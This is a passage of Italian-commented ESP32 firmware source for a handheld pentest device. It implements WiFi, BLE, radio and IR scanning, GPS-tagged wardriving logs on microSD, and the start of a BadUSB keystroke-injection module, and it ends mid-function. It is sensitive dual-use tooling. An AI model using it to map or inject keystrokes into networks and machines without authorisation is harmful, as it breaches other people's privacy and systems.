/*
 * NexusSec ESP32 — firmware nostro (Opzione B)
 * ---------------------------------------------
 * Scaffold v0.1.0 per la scheda ESP32-DIV V2 (ESP32-S3 + ILI9341 320x240).
 *
 * In questa prima versione:
 *   - Boot con self-test + AVVISO LEGALE (uso solo su target autorizzati).
 *   - Menu a "profili" in stile NexusSec (flat, accent cyan su fondo scuro).
 *   - DOPPIO ORIENTAMENTO (verticale/orizzontale) commutabile da Impostazioni,
 *     salvato in NVS: il layout si adatta da solo a tft.width()/height().
 *   - Primo modulo REALE funzionante: Scan WiFi 2.4 GHz (SSID/canale/RSSI/enc).
 *   - Gli altri profili sono presenti a menu come "in sviluppo".
 *
 * Input: 3 tasti fisici — PREV / OK / NEXT (vedi BTN_* e diagram.json Wokwi).
 * Il touch della scheda reale sara' aggiunto piu' avanti come input alternativo.
 *
 * Uso consentito SOLO su reti/dispositivi autorizzati (pentest/lab).
 */

#include <Arduino.h>
#include <TFT_eSPI.h>
#include <WiFi.h>
#include <Preferences.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <SPI.h>
#include <esp_wifi.h>
#include <RF24.h>
#include <IRrecv.h>
#include <IRremoteESP8266.h>
#include <IRutils.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <FS.h>
#include <SD.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
#include "board_pins.h"

#ifndef NXS_FW_VERSION
#define NXS_FW_VERSION "0.1.0"
#endif

// ----------------------------------------------------------------------------
// Tasti fisici (attivi a massa, INPUT_PULLUP). Coincidono col diagram.json Wokwi.
// ----------------------------------------------------------------------------
#define BTN_PREV BTN_PREV_PIN
#define BTN_OK   BTN_OK_PIN
#define BTN_NEXT BTN_NEXT_PIN

// ----------------------------------------------------------------------------
// Palette NexusSec (RGB565)
// ----------------------------------------------------------------------------
#define RGB(r, g, b) ((uint16_t)((((r)&0xF8) << 8) | (((g)&0xFC) << 3) | ((b) >> 3)))
static const uint16_t C_BG    = RGB(5, 9, 12);
static const uint16_t C_PANEL = RGB(10, 18, 24);
static const uint16_t C_LINE  = RGB(22, 38, 46);
static const uint16_t C_CY    = RGB(34, 224, 230);
static const uint16_t C_TXT   = RGB(207, 224, 228);
static const uint16_t C_MUT   = RGB(95, 120, 127);
static const uint16_t C_OK    = RGB(58, 211, 156);
static const uint16_t C_WARN  = RGB(246, 183, 60);
static const uint16_t C_CRIT  = RGB(255, 93, 93);
static const uint16_t C_SEL   = RGB(13, 43, 49);

TFT_eSPI tft = TFT_eSPI();
Preferences prefs;
USBHIDKeyboard Keyboard;   // BadUSB/HID (USB nativa ESP32-S3)

// Bus SPI condiviso da radio (NRF24/CC1101) e microSD (pin 12/13/11).
static SPIClass radioSPI(HSPI);
static bool radioSpiBegun = false;
static bool sdMounted = false;

static void ensureRadioSpi() {
  if (!radioSpiBegun) {
    radioSPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, -1);
    radioSpiBegun = true;
  }
}
// Monta la microSD (bus radio, CS10). Idempotente.
static bool sdInit() {
  if (sdMounted) return true;
  ensureRadioSpi();
  sdMounted = SD.begin(SD_CS_PIN, radioSPI);
  return sdMounted;
}

// ----------------------------------------------------------------------------
// Profili del menu
// ----------------------------------------------------------------------------
enum Profile {
  P_RECON = 0, P_ATTACK, P_HANDSHAKE, P_BLE, P_NRF24,
  P_SUBGHZ, P_IR, P_BADUSB, P_LOOT, P_SETTINGS, P_COUNT
};
static const char *PROF_NAME[P_COUNT] = {
  "Recon WiFi", "Attacco WiFi", "Handshake", "Bluetooth", "NRF24 2.4G",
  "Sub-GHz", "Infrarossi", "BadUSB", "Loot / SD", "Impostazioni"
};

// ----------------------------------------------------------------------------
// Stato applicazione
// ----------------------------------------------------------------------------
enum AppState { ST_LEGAL, ST_HOME, ST_MODULE };
AppState state = ST_LEGAL;
int      homeSel = 0;       // riquadro selezionato nella home
int      curProfile = -1;   // profilo aperto
bool     wardrivingMode = false; // sotto-modalità di Recon WiFi
bool     layoutIT = false;       // BadUSB: layout tastiera IT (default US)
uint8_t  rotation = 0;      // 0 = verticale (240x320), 1 = orizzontale (320x240)

int W = 240, H = 320;       // dimensioni correnti dello schermo
const int SBAR = 24;        // altezza status bar
const int FBAR = 20;        // altezza barra suggerimenti

// ----------------------------------------------------------------------------
// Input tasti (debounce + fronte di discesa)
// ----------------------------------------------------------------------------
struct Btn { uint8_t pin; bool last; uint32_t t; };
bool pressed(Btn &b) {
  bool now = digitalRead(b.pin);
  if (now != b.last && (millis() - b.t) > 30) {
    b.t = millis();
    b.last = now;
    if (now == LOW) return true;   // fronte di discesa = premuto
  }
  return false;
}

#if NXS_TARGET_SIM
// Tasti nativi (solo simulatore)
Btn bPrev{BTN_PREV, HIGH, 0}, bOk{BTN_OK, HIGH, 0}, bNext{BTN_NEXT, HIGH, 0};
#else
// Tasti reali sull'espansore PCF8574 (I2C)
#include <PCF8574.h>
static PCF8574 pcf(PCF8574_ADDR_MIN);
static bool pcfReady = false;
static uint8_t pcfLast = 0xFF;
static void pcfBegin() {
#if (I2C_SDA_PIN >= 0)
  Wire.begin(I2C_SDA_PIN, I2C_SCL_PIN);
#else
  Wire.begin();
#endif
  pcfReady = pcf.begin();
}
static bool pcfEdge(uint8_t cur, uint8_t bit) {
  // attivo a massa: premuto = bit basso; fronte di discesa
  bool nowLow = !((cur >> bit) & 1);
  bool wasLow = !((pcfLast >> bit) & 1);
  return nowLow && !wasLow;
}
static void pollPcf(bool &p, bool &o, bool &n) {
  if (!pcfReady) return;
  uint8_t cur = pcf.read8();
  if (pcfEdge(cur, PCF_BTN_PREV)) p = true;
  if (pcfEdge(cur, PCF_BTN_OK))   o = true;
  if (pcfEdge(cur, PCF_BTN_NEXT)) n = true;
  pcfLast = cur;
}
#endif

// Touch ILI9341 (XPT2046): tap a zone -> PREV / OK / NEXT (sempre attivo)
static bool touchDown = false;
static void pollTouch(bool &p, bool &o, bool &n) {
  uint16_t z = tft.getTouchRawZ();
  if (z > 600) {
    if (!touchDown) {
      touchDown = true;
      uint16_t rx = 0, ry = 0;
      tft.getTouchRaw(&rx, &ry);
      long xr = rx;
      if (xr < TOUCH_RAW_MIN) xr = TOUCH_RAW_MIN;
      if (xr > TOUCH_RAW_MAX) xr = TOUCH_RAW_MAX;
      int zone = (int)((xr - TOUCH_RAW_MIN) * 3 / (TOUCH_RAW_MAX - TOUCH_RAW_MIN)); // 0..2
      if (zone <= 0) p = true; else if (zone == 1) o = true; else n = true;
    }
  } else {
    touchDown = false;
  }
}

// Lettura unificata della navigazione (tasti + touch)
static void readNav(bool &p, bool &o, bool &n) {
  p = o = n = false;
#if NXS_TARGET_SIM
  if (pressed(bPrev)) p = true;
  if (pressed(bOk))   o = true;
  if (pressed(bNext)) n = true;
#else
  pollPcf(p, o, n);
#endif
  pollTouch(p, o, n);
}

// ============================================================================
// Helper di disegno
// ============================================================================
void statusBar(const char *title) {
  tft.fillRect(0, 0, W, SBAR, C_PANEL);
  tft.drawFastHLine(0, SBAR - 1, W, C_LINE);
  tft.setTextDatum(ML_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(C_CY, C_PANEL);
  tft.drawString("NXS", 6, SBAR / 2);
  tft.setTextColor(C_MUT, C_PANEL);
  tft.drawString(title, 40, SBAR / 2);
  // batteria + ora (segnaposto)
  tft.setTextDatum(MR_DATUM);
  tft.setTextColor(C_OK, C_PANEL);
  tft.drawString("82%", W - 44, SBAR / 2);
  tft.setTextColor(C_TXT, C_PANEL);
  tft.drawString("14:22", W - 6, SBAR / 2);
}

void footerBar(const char *hint) {
  tft.fillRect(0, H - FBAR, W, FBAR, C_PANEL);
  tft.drawFastHLine(0, H - FBAR, W, C_LINE);
  tft.setTextDatum(ML_DATUM);
  tft.setTextFont(1);
  tft.setTextColor(C_MUT, C_PANEL);
  tft.drawString(hint, 6, H - FBAR / 2);
}

// Icone minimali disegnate con primitive (bitmap dedicate arriveranno dopo)
void drawIcon(int id, int cx, int cy, int s, uint16_t col) {
  int r = s / 2;
  switch (id) {
    case P_RECON:   // barre segnale
      for (int i = 0; i < 4; i++)
        tft.fillRect(cx - r + i * (s / 4), cy + r - (i + 1) * (s / 5), s / 6, (i + 1) * (s / 5), col);
      break;
    case P_ATTACK:  // bersaglio
      tft.drawCircle(cx, cy, r, col);
      tft.drawCircle(cx, cy, r / 2, col);
      tft.fillCircle(cx, cy, 2, col);
      break;
    case P_HANDSHAKE: // chiave
      tft.drawCircle(cx - r / 2, cy - r / 2, r / 3, col);
      tft.drawLine(cx - r / 3, cy - r / 3, cx + r, cy + r, col);
      tft.drawLine(cx + r, cy + r, cx + r - 4, cy + r, col);
      break;
    case P_BLE: {   // rune bluetooth
      int x = cx, y0 = cy - r, y1 = cy + r;
      tft.drawLine(x, y0, x, y1, col);
      tft.drawLine(x, y0, x + r / 2, cy - r / 2, col);
      tft.drawLine(x + r / 2, cy - r / 2, x - r / 2, cy + r / 2, col);
      tft.drawLine(x - r / 2, cy - r / 2, x + r / 2, cy + r / 2, col);
      tft.drawLine(x + r / 2, cy + r / 2, x, y1, col);
      break;
    }
    case P_NRF24:   // antenna con onde
      tft.fillCircle(cx, cy + r / 2, 2, col);
      tft.drawLine(cx, cy + r / 2, cx, cy - r, col);
      tft.drawCircle(cx, cy + r / 2, r / 2, col);
      break;
    case P_SUBGHZ: {// onda quadra
      int x = cx - r, y = cy;
      bool up = true;
      for (int i = 0; i < 4; i++) {
        tft.drawLine(x, up ? cy - r / 2 : cy + r / 2, x + s / 4, up ? cy - r / 2 : cy + r / 2, col);
        tft.drawLine(x + s / 4, cy - r / 2, x + s / 4, cy + r / 2, col);
        x += s / 4; up = !up;
      }
      (void)y;
      break;
    }
    case P_IR:      // emettitore IR
      tft.fillCircle(cx - r / 2, cy, 3, col);
      tft.drawCircle(cx, cy, r / 2, col);
      tft.drawCircle(cx, cy, r, col);
      break;
    case P_BADUSB:  // tastierina
      tft.drawRoundRect(cx - r, cy - r / 2, s, r, 2, col);
      tft.fillCircle(cx - r / 2, cy, 1, col);
      tft.fillCircle(cx, cy, 1, col);
      tft.fillCircle(cx + r / 2, cy, 1, col);
      break;
    case P_LOOT:    // scheda SD
      tft.drawRoundRect(cx - r / 2, cy - r, r, s, 2, col);
      tft.drawLine(cx + r / 2 - 3, cy - r, cx + r / 2 - 3, cy - r + 4, col);
      break;
    case P_SETTINGS: // ingranaggio
      tft.drawCircle(cx, cy, r / 2, col);
      tft.fillCircle(cx, cy, 2, col);
      for (int a = 0; a < 360; a += 60) {
        float rad = a * 3.14159 / 180.0;
        tft.drawLine(cx + cos(rad) * (r / 2), cy + sin(rad) * (r / 2),
                     cx + cos(rad) * r, cy + sin(rad) * r, col);
      }
      break;
  }
}

// ============================================================================
// Avviso legale (bloccante finche' non si accetta con OK)
// ============================================================================
void drawLegal() {
  tft.fillScreen(C_BG);
  int cy = H / 2;
  // logo semplice
  tft.drawRoundRect(W / 2 - 18, 28, 36, 40, 6, C_CY);
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(4);
  tft.setTextColor(C_TXT, C_BG);
  tft.drawString("NEXUSSEC", W / 2, 92);
  tft.setTextFont(2);
  tft.setTextColor(C_CY, C_BG);
  tft.drawString("ESP32 - DIV V2", W / 2, 116);

  tft.setTextColor(C_OK, C_BG);
  tft.drawString("Self-test moduli: OK", W / 2, cy - 40);

  // riquadro avviso
  int bx = 10, bw = W - 20, by = cy - 12, bh = 66;
  tft.drawRoundRect(bx, by, bw, bh, 4, C_WARN);
  tft.setTextColor(C_WARN, C_BG);
  tft.setTextFont(2);
  tft.drawString("USO AUTORIZZATO", W / 2, by + 16);
  tft.setTextFont(1);
  tft.drawString("Solo su reti e dispositivi", W / 2, by + 36);
  tft.drawString("di cui hai il permesso.", W / 2, by + 50);

  tft.setTextColor(C_CY, C_BG);
  tft.setTextFont(2);
  tft.drawString("[ OK ] Accetto", W / 2, cy + 74);
  tft.setTextColor(C_MUT, C_BG);
  tft.setTextFont(1);
  tft.drawString("firmware v" NXS_FW_VERSION, W / 2, H - 24);
}

// ============================================================================
// Home: griglia di profili
// ============================================================================
void drawHome() {
  tft.fillScreen(C_BG);
  statusBar("MENU PROFILI");

  int cols = (W > H) ? 5 : 2;
  int rows = (P_COUNT + cols - 1) / cols;
  int gap = 6;
  int gx = gap, gy = SBAR + gap;
  int gw = W - gap * 2;
  int gh = H - SBAR - FBAR - gap * 2;
  int tw = (gw - (cols - 1) * gap) / cols;
  int th = (gh - (rows - 1) * gap) / rows;

  for (int i = 0; i < P_COUNT; i++) {
    int c = i % cols, rr = i / cols;
    int x = gx + c * (tw + gap);
    int y = gy + rr * (th + gap);
    bool sel = (i == homeSel);
    tft.fillRoundRect(x, y, tw, th, 5, sel ? C_SEL : C_PANEL);
    tft.drawRoundRect(x, y, tw, th, 5, sel ? C_CY : C_LINE);
    drawIcon(i, x + tw / 2, y + th / 2 - 8, min(tw, th) / 3, C_CY);
    tft.setTextDatum(MC_DATUM);
    tft.setTextFont(1);
    tft.setTextColor(sel ? C_CY : C_TXT, sel ? C_SEL : C_PANEL);
    tft.drawString(PROF_NAME[i], x + tw / 2, y + th - 10);
  }
  footerBar("PREV/NEXT scorri   OK apri");
}

// ============================================================================
// Modulo REALE: Scan WiFi
// ============================================================================
void moduleWifiScan() {
  tft.fillScreen(C_BG);
  statusBar("RECON WIFI");
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(C_CY, C_BG);
  tft.drawString("Scansione 2.4 GHz...", W / 2, H / 2);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  int n = WiFi.scanNetworks();

  tft.fillScreen(C_BG);
  statusBar("RECON WIFI");

  char hdr[24];
  snprintf(hdr, sizeof(hdr), "%d reti trovate", n < 0 ? 0 : n);
  tft.setTextDatum(ML_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(C_MUT, C_BG);
  tft.drawString(hdr, 6, SBAR + 12);

  int y = SBAR + 28;
  int rowH = 20;
  int maxRows = (H - FBAR - y) / rowH;
  for (int i = 0; i < n && i < maxRows; i++) {
    bool open = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN);
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) ssid = "<nascosta>";
    if (ssid.length() > 16) ssid = ssid.substring(0, 15) + "~";

    tft.setTextDatum(ML_DATUM);
    tft.setTextColor(C_TXT, C_BG);
    tft.drawString(ssid, 6, y + rowH / 2);

    char meta[20];
    snprintf(meta, sizeof(meta), "c%d %ddBm", WiFi.channel(i), WiFi.RSSI(i));
    tft.setTextDatum(MR_DATUM);
    tft.setTextColor(open ? C_WARN : C_MUT, C_BG);
    tft.drawString(meta, W - 6, y + rowH / 2);

    tft.drawFastHLine(0, y + rowH - 1, W, C_LINE);
    y += rowH;
  }
  if (n <= 0) {
    tft.setTextDatum(MC_DATUM);
    tft.setTextColor(C_MUT, C_BG);
    tft.drawString("Nessuna rete", W / 2, H / 2);
  }
  WiFi.scanDelete();
  footerBar("OK ripeti  NEXT wardriving  PREV menu");
}

// ============================================================================
// Modulo REALE: Scan BLE
// ============================================================================
void moduleBleScan() {
  tft.fillScreen(C_BG);
  statusBar("BLUETOOTH / BLE");
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(C_CY, C_BG);
  tft.drawString("Scansione BLE...", W / 2, H / 2);

  BLEDevice::init("");
  BLEScan *s = BLEDevice::getScan();
  s->setActiveScan(true);
  s->setInterval(100);
  s->setWindow(99);
  BLEScanResults res = s->start(3, false);
  int n = res.getCount();

  tft.fillScreen(C_BG);
  statusBar("BLUETOOTH / BLE");
  char hdr[24];
  snprintf(hdr, sizeof(hdr), "%d dispositivi BLE", n);
  tft.setTextDatum(ML_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(C_MUT, C_BG);
  tft.drawString(hdr, 6, SBAR + 12);

  int y = SBAR + 28, rowH = 20, maxRows = (H - FBAR - y) / rowH;
  for (int i = 0; i < n && i < maxRows; i++) {
    BLEAdvertisedDevice d = res.getDevice(i);
    String nm = d.haveName() ? String(d.getName().c_str()) : String(d.getAddress().toString().c_str());
    if (nm.length() > 16) nm = nm.substring(0, 15) + "~";
    tft.setTextDatum(ML_DATUM);
    tft.setTextColor(C_TXT, C_BG);
    tft.drawString(nm, 6, y + rowH / 2);

    char meta[12];
    snprintf(meta, sizeof(meta), "%ddBm", d.getRSSI());
    tft.setTextDatum(MR_DATUM);
    tft.setTextColor(C_MUT, C_BG);
    tft.drawString(meta, W - 6, y + rowH / 2);

    tft.drawFastHLine(0, y + rowH - 1, W, C_LINE);
    y += rowH;
  }
  if (n <= 0) {
    tft.setTextDatum(MC_DATUM);
    tft.setTextColor(C_MUT, C_BG);
    tft.drawString("Nessun dispositivo", W / 2, H / 2);
  }
  s->clearResults();
  footerBar("OK ripeti   PREV menu");
}

// ============================================================================
// Modulo REALE: analisi spettro 2.4 GHz con NRF24 (pin ESP32-DIV V2)
// ============================================================================
static RF24 nrf(NRF_SCAN_CE, NRF_SCAN_CSN);
static bool nrfReady = false;

void moduleNrf24Scan() {
  tft.fillScreen(C_BG);
  statusBar("NRF24 2.4 GHz");
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(C_CY, C_BG);
  tft.drawString("Analisi 2.4 GHz...", W / 2, H / 2);

  if (!nrfReady) {
    ensureRadioSpi();
    nrfReady = nrf.begin(&radioSPI);
  }

  const int CH = 64;  // canali 0..63 (2400..2463 MHz)
  uint8_t vals[CH];
  memset(vals, 0, sizeof(vals));
  if (nrfReady) {
    nrf.setAutoAck(false);
    nrf.stopListening();
    for (int rep = 0; rep < 80; rep++) {
      for (int c = 0; c < CH; c++) {
        nrf.setChannel(c);
        nrf.startListening();
        delayMicroseconds(130);
        bool sig = nrf.testCarrier();
        nrf.stopListening();
        if (sig && vals[c] < 250) vals[c]++;
      }
    }
  }

  tft.fillScreen(C_BG);
  statusBar("NRF24 2.4 GHz");
  tft.setTextDatum(ML_DATUM);
  tft.setTextFont(1);
  tft.setTextColor(C_MUT, C_BG);
  tft.drawString(nrfReady ? "Attivita' per canale (0-63)" : "NRF24 non rilevato", 6, SBAR + 10);

  int gx = 6, gy = SBAR + 22, gw = W - 12, gh = H - FBAR - gy - 4;
  tft.drawRect(gx, gy, gw, gh, C_LINE);
  int bw = gw / CH; if (bw < 1) bw = 1;
  uint8_t mx = 1;
  for (int c = 0; c < CH; c++) if (vals[c] > mx) mx = vals[c];
  for (int c = 0; c < CH; c++) {
    int bh = (int)((long)vals[c] * (gh - 2) / mx);
    tft.fillRect(gx + 1 + c * bw, gy + gh - 1 - bh, bw - 1 > 0 ? bw - 1 : 1, bh, C_CY);
  }
  footerBar("OK ripeti   PREV menu");
}

// ============================================================================
// Modulo REALE: cattura IR (pin ESP32-DIV V2)
// ============================================================================
static IRrecv irrecv(IR_RX_PIN, 1024, 15, true);
static decode_results irres;
static bool irReady = false;

void moduleIrCapture() {
  tft.fillScreen(C_BG);
  statusBar("INFRAROSSI");
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(C_CY, C_BG);
  tft.drawString("Punta un telecomando", W / 2, H / 2 - 12);
  tft.setTextColor(C_MUT, C_BG);
  tft.setTextFont(1);
  tft.drawString("e premi un tasto (5s)...", W / 2, H / 2 + 10);

  if (!irReady) { irrecv.enableIRIn(); irReady = true; }
  uint32_t t0 = millis();
  bool got = false;
  while (millis() - t0 < 5000) {
    if (irrecv.decode(&irres)) { got = true; break; }
    delay(5);
  }

  tft.fillScreen(C_BG);
  statusBar("INFRAROSSI");
  if (got) {
    tft.setTextDatum(ML_DATUM);
    tft.setTextFont(2);
    tft.setTextColor(C_MUT, C_BG);
    tft.drawString("Protocollo:", 8, SBAR + 22);
    tft.setTextColor(C_CY, C_BG);
    tft.drawString(typeToString(irres.decode_type), 8, SBAR + 44);
    char code[26];
    snprintf(code, sizeof(code), "0x%llX", (unsigned long long)irres.value);
    tft.setTextColor(C_MUT, C_BG);
    tft.drawString("Codice:", 8, SBAR + 74);
    tft.setTextColor(C_TXT, C_BG);
    tft.drawString(code, 8, SBAR + 96);
    char bits[16];
    snprintf(bits, sizeof(bits), "%d bit", irres.bits);
    tft.setTextColor(C_MUT, C_BG);
    tft.drawString(bits, 8, SBAR + 124);
    irrecv.resume();
  } else {
    tft.setTextDatum(MC_DATUM);
    tft.setTextColor(C_MUT, C_BG);
    tft.drawString("Nessun segnale", W / 2, H / 2);
  }
  footerBar("OK ripeti   PREV menu");
}

// ============================================================================
// Modulo REALE: Sub-GHz CC1101 (RSSI/presenza sui pin ESP32-DIV V2)
// ============================================================================
void moduleSubghz() {
  tft.fillScreen(C_BG);
  statusBar("SUB-GHZ CC1101");
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(C_CY, C_BG);
  tft.drawString("CC1101 433.92 MHz...", W / 2, H / 2);

  ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS_PIN);
  ELECHOUSE_cc1101.setGDO(CC1101_GDO0_PIN, CC1101_GDO2_PIN);
  ELECHOUSE_cc1101.Init();
  bool present = ELECHOUSE_cc1101.getCC1101();
  ELECHOUSE_cc1101.setMHZ(433.92);
  ELECHOUSE_cc1101.SetRx();

  long acc = 0; int n = 0, rssiMax = -127;
  uint32_t t0 = millis();
  while (millis() - t0 < 1500) {
    int r = ELECHOUSE_cc1101.getRssi();
    if (r > rssiMax) rssiMax = r;
    acc += r; n++;
    delay(20);
  }
  int rssiAvg = n ? (int)(acc / n) : 0;

  tft.fillScreen(C_BG);
  statusBar("SUB-GHZ CC1101");
  if (present) {
    tft.setTextDatum(ML_DATUM);
    tft.setTextFont(2);
    tft.setTextColor(C_MUT, C_BG); tft.drawString("Frequenza:", 8, SBAR + 22);
    tft.setTextColor(C_CY, C_BG);  tft.drawString("433.92 MHz", 8, SBAR + 44);
    char b[24];
    tft.setTextColor(C_MUT, C_BG); tft.drawString("RSSI medio:", 8, SBAR + 74);
    snprintf(b, sizeof(b), "%d dBm", rssiAvg);
    tft.setTextColor(C_TXT, C_BG); tft.drawString(b, 8, SBAR + 96);
    tft.setTextColor(C_MUT, C_BG); tft.drawString("RSSI max:", 8, SBAR + 124);
    snprintf(b, sizeof(b), "%d dBm", rssiMax);
    tft.setTextColor(C_TXT, C_BG); tft.drawString(b, 8, SBAR + 146);
  } else {
    tft.setTextDatum(MC_DATUM);
    tft.setTextColor(C_CRIT, C_BG);
    tft.drawString("CC1101 non rilevato", W / 2, H / 2);
  }
  footerBar("OK ripeti   PREV menu");
}

// ============================================================================
// GPS (Neo-6M, UART2) — parsing minimale NMEA GGA per lat/lon
// ============================================================================
static HardwareSerial gpsSerial(2);
static bool   gpsStarted = false;
static bool   gFix = false;
static double gLat = 0, gLon = 0;

static void gpsBegin() {
  if (!gpsStarted) {
    gpsSerial.begin(GPS_UART_BAUD, SERIAL_8N1, GPS_UART_RX, GPS_UART_TX);
    gpsStarted = true;
  }
}
static void gpsEnd() {
  if (gpsStarted) { gpsSerial.end(); gpsStarted = false; }
}
static double nmeaToDeg(const char *v, char hemi) {
  double val = atof(v);
  int deg = (int)(val / 100);
  double minutes = val - deg * 100;
  double d = deg + minutes / 60.0;
  if (hemi == 'S' || hemi == 'W') d = -d;
  return d;
}
static void gpsPoll() {
  static char line[100];
  static int idx = 0;
  while (gpsSerial.available()) {
    char c = gpsSerial.read();
    if (c == '\n' || c == '\r') {
      line[idx] = 0;
      if (idx > 6 && (strncmp(line, "$GPGGA", 6) == 0 || strncmp(line, "$GNGGA", 6) == 0)) {
        // campi: 0=$..GGA 1=time 2=lat 3=N/S 4=lon 5=E/W 6=fixQ
        char *fld[10] = {0};
        int nf = 0;
        char *p = line;
        fld[nf++] = p;
        while (*p && nf < 10) { if (*p == ',') { *p = 0; fld[nf++] = p + 1; } p++; }
        if (nf >= 7 && fld[6] && atoi(fld[6]) > 0 && fld[2][0] && fld[4][0]) {
          gLat = nmeaToDeg(fld[2], fld[3][0]);
          gLon = nmeaToDeg(fld[4], fld[5][0]);
          gFix = true;
        }
      }
      idx = 0;
    } else if (idx < 99) {
      line[idx++] = c;
    }
  }
}

// ============================================================================
// Modulo REALE: Wardriving (WiFi continuo + GPS opz. -> CSV su SD per HORUS)
// ============================================================================
void moduleWardriving() {
  tft.fillScreen(C_BG);
  statusBar("WARDRIVING");
  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(C_CY, C_BG);
  tft.drawString("Avvio wardriving...", W / 2, H / 2);

  bool sd = sdInit();
  gpsBegin();

  File f;
  const char *fn = "/WARDRIVE.csv";
  if (sd) {
    bool isNew = !SD.exists(fn);
    f = SD.open(fn, FILE_APPEND);
    if (f && isNew) f.println("BSSID,SSID,Enc,Channel,RSSI,Lat,Lon,Timestamp");
  }

  static String seen[300];
  static int seenN = 0;   // static: dedup mantenuto tra sessioni
  int added = 0;

  uint32_t t0 = millis();
  while (millis() - t0 < 15000) {
    gpsPoll();
    int n = WiFi.scanNetworks(false, true);
    for (int i = 0; i < n; i++) {
      String bssid = WiFi.BSSIDstr(i);
      bool dup = false;
      for (int k = 0; k < seenN; k++) if (seen[k] == bssid) { dup = true; break; }
      if (!dup && seenN < 300) {
        seen[seenN++] = bssid;
        added++;
        if (f) {
          f.printf("%s,%s,%s,%d,%d,%.6f,%.6f,%lu\n",
                   bssid.c_str(), WiFi.SSID(i).c_str(),
                   (WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "OPEN" : "WPA"),
                   WiFi.channel(i), WiFi.RSSI(i),
                   gFix ? gLat : 0.0, gFix ? gLon : 0.0,
                   (unsigned long)(millis() / 1000));
        }
      }
    }
    WiFi.scanDelete();
    gpsPoll();

    // aggiornamento live
    tft.fillRect(0, SBAR, W, H - SBAR - FBAR, C_BG);
    tft.setTextDatum(MC_DATUM);
    tft.setTextFont(4);
    tft.setTextColor(C_CY, C_BG);
    char num[8]; snprintf(num, sizeof(num), "%d", seenN);
    tft.drawString(num, W / 2, SBAR + 40);
    tft.setTextFont(2);
    tft.setTextColor(C_MUT, C_BG);
    tft.drawString("reti totali", W / 2, SBAR + 70);
    char nn[20]; snprintf(nn, sizeof(nn), "+%d nuove", added);
    tft.setTextColor(C_OK, C_BG);
    tft.drawString(nn, W / 2, SBAR + 96);
    tft.setTextColor(gFix ? C_OK : C_WARN, C_BG);
    tft.drawString(gFix ? "GPS: FIX" : "GPS: nessun fix", W / 2, SBAR + 124);
    tft.setTextColor(C_MUT, C_BG);
    tft.setTextFont(1);
    tft.drawString(sd ? "-> /WARDRIVE.csv (HORUS)" : "microSD assente: no log", W / 2, SBAR + 150);
  }

  if (f) f.close();
  gpsEnd();
  footerBar("OK altra sessione   PREV menu");
}

// ============================================================================
// Modulo REALE: Loot / microSD (info scheda + lista file)
// ============================================================================
void moduleLoot() {
  tft.fillScreen(C_BG);
  statusBar("LOOT / microSD");
  if (!sdInit()) {
    tft.setTextDatum(MC_DATUM);
    tft.setTextFont(2);
    tft.setTextColor(C_CRIT, C_BG);
    tft.drawString("microSD non rilevata", W / 2, H / 2);
    footerBar("OK riprova   PREV menu");
    return;
  }
  uint64_t cardMB = SD.cardSize() / (1024ULL * 1024ULL);
  uint64_t usedMB = SD.usedBytes() / (1024ULL * 1024ULL);
  char hdr[36];
  snprintf(hdr, sizeof(hdr), "SD %lluMB - usati %lluMB",
           (unsigned long long)cardMB, (unsigned long long)usedMB);
  tft.setTextDatum(ML_DATUM);
  tft.setTextFont(1);
  tft.setTextColor(C_MUT, C_BG);
  tft.drawString(hdr, 6, SBAR + 10);

  File root = SD.open("/");
  int y = SBAR + 24, rowH = 18, maxRows = (H - FBAR - y) / rowH, cnt = 0;
  if (root) {
    File f = root.openNextFile();
    while (f && cnt < maxRows) {
      String nm = String(f.name());
      if (nm.length() > 18) nm = nm.substring(0, 17) + "~";
      tft.setTextDatum(ML_DATUM);
      tft.setTextFont(2);
      tft.setTextColor(f.isDirectory() ? C_CY : C_TXT, C_BG);
      tft.drawString((f.isDirectory() ? "/" : " ") + nm, 6, y + rowH / 2);
      if (!f.isDirectory()) {
        char sz[14];
        snprintf(sz, sizeof(sz), "%uB", (unsigned)f.size());
        tft.setTextDatum(MR_DATUM);
        tft.setTextColor(C_MUT, C_BG);
        tft.drawString(sz, W - 6, y + rowH / 2);
      }
      y += rowH; cnt++;
      f = root.openNextFile();
    }
  }
  if (cnt == 0) {
    tft.setTextDatum(MC_DATUM);
    tft.setTextColor(C_MUT, C_BG);
    tft.drawString("(vuota)", W / 2, H / 2);
  }
  footerBar("OK aggiorna   PREV menu");
}

// ============================================================================
// Modulo REALE: BadUSB / HID (DuckyScript subset da microSD, USB nativa S3)
//   Layout tastiera US di default (mappa IT: TODO). SOLO su macchine autorizzate.
// ============================================================================
static int badusbSel = 0;
static String plList[20];
static int plN = 0;

// --- Digitazione con layout tastiera IT (beta) ---
// Manda il tasto FISICO US che, su layout italiano, produce il carattere voluto.
static void pressCombo(uint8_t mod1, uint8_t mod2, uint8_t proxy) {
  if (mod1) Keyboard.press(mod1);
  if (mod2) Keyboard.press(mod2);
  Keyboard.press(proxy);
  delay(6);
  Keyboard.releaseAll();
}
static void typeITchar(char c) {
  const uint8_t SH = KEY_LEFT_SHIFT, AG = KEY_RIGHT_ALT;   // AltGr
  switch (c) {
    case '!': pressCombo(SH, 0, '1'); return;
    case '"': pressCombo(SH, 0, '2'); return;
    case '$': pressCombo(SH, 0, '4'); return;
